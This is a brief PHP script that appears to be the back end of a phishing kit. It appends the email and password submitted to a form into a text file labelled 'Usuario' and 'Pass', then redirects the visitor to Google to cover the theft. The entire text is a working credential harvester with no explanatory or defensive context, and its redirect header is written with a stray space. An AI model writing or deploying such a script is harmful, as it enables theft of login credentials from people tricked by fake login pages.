<?php
file_put_contents( "username.txt", "Usuario: " .$_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND); 
header('Location : https://www.google.com/');
exit();
